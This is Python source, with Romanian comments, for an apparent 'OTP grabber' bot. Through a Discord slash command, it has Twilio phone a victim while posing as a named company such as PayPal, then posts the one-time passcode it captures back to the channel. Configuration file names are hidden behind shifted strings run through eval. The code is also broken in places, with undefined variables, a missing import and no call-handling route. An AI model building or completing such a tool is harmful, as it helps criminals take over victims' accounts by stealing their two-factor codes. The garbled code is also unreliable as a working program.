import time
import os
import discord_slash.utils.manage_commands as manage_commands
import requests
import discord
import json
from discord.ext import commands
from discord_slash import SlashCommand, SlashContext
from twilio.rest import Client
from flask import Flask

# Configurare inițială
a = lambda x: ''.join(chr(ord(i) - 1) for i in x)
b = eval(a('"VQD@qo@@r|ro^@uy}rro@vnttq{omrr"'))
c = eval(a('"Urdyksyb:qo@"'))
d = eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"'))

# Creare fișiere de configurare dacă nu există
if b not in os.listdir():
    with open(b, 'w') as file:
        file.write('{"account_sid":"?", "auth_token":"?", "Twilio Phone Number":"+1?", "ngrok_url":"https://you-url.ngrok.io", "server_id":"?", "bot_token":"?"}')

if c not in os.listdir():
    open(c, 'w').close()

if d not in os.listdir():
    os.mkdir(d)

# Citire configurare
raw_config = json.loads(open(b, 'r').read())

client_discord = commands.Bot(command_prefix='')
slash = SlashCommand(client_discord, sync_commands=True)
server_id = int(raw_config['server_id'])

account_sid = raw_config['account_sid']
auth_token = raw_config['auth_token']
your_twilio_phone_number = raw_config['Twilio Phone Number']
ngrok = raw_config['ngrok_url']
client = Client(account_sid, auth_token)

app = Flask(__name__)

@slash.slash(
    name='dial',
    description='This command initiates a call',
    guild_ids=[server_id],
    options=[
        manage_commands.create_option(
            name='cell_phone',
            description='Add +1, e.g., +1987654321',
            required=True,
            option_type=3
        ),
        manage_commands.create_option(
            name='otp_digits',
            description='e.g., 8, 6, or 4',
            required=True,
            option_type=3
        ),
        manage_commands.create_option(
            name='client_name',
            description='e.g., Smith',
            required=True,
            option_type=3
        ),
        manage_commands.create_option(
            name='company_name',
            description='e.g., Paypal',
            required=True,
            option_type=3
        )
    ]
)
async def _call(ctx=SlashContext, cell_phone=str, otp_digits=str, client_name=str, company_name=str):
    await ctx.send('Initiating Call...')
    open(f, 'w').write(f'{otp_digits}')
    open(g, 'w').write(f'{client_name}')
    open(e, 'w').write(f'{company_name}')
    
    try:
        call = client.calls.create(
            url=f'{ngrok}/voice',
            to=f'{cell_phone}',
            from_=f'{your_twilio_phone_number}'
        )
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")
        return

    sid = call.sid
    print(sid)

    status_dict = {'queued': 0, 'ringing': 0, 'in-progress': 0, 'completed': 0, 'failed': 0, 'no-answer': 0, 'canceled': 0, 'busy': 0}

    while True:
        call_status = client.calls(sid).fetch().status
        if call_status in status_dict and not status_dict[call_status] >= 1:
            embed = discord.Embed(title='', description=f'Call {call_status.replace("-", " ").title()}', color=discord.Colour.green() if call_status == 'completed' else discord.Colour.red())
            await ctx.channel.send(embed=embed)
            status_dict[call_status] += 1
        
        if call_status == 'completed' or call_status == 'failed' or call_status == 'no-answer' or call_status == 'canceled' or call_status == 'busy':
            break
        await asyncio.sleep(1)

    otp = open(f'grabbed_otp.txt', 'r').read()
    call1 = client.calls(sid).fetch()
    if not otp:
        embed = discord.Embed(title='', description=f'Unable To Grab OTP\n\nPrice : {call1.price}\nDuration : {call1.duration} secs', color=discord.Colour.red())
    else:
        embed = discord.Embed(title='', description=f'{otp}\n\nPrice : {call1.price}\nDuration : {call1.duration} secs', color=discord.Colour.green())
    
    await ctx.channel.send(embed=embed)
    open('grabbed_otp.txt', 'w').close()

# Asigură-te că aplicația Flask este pornită corect
if __name__ == "__main__":
    app.run(port=5000)
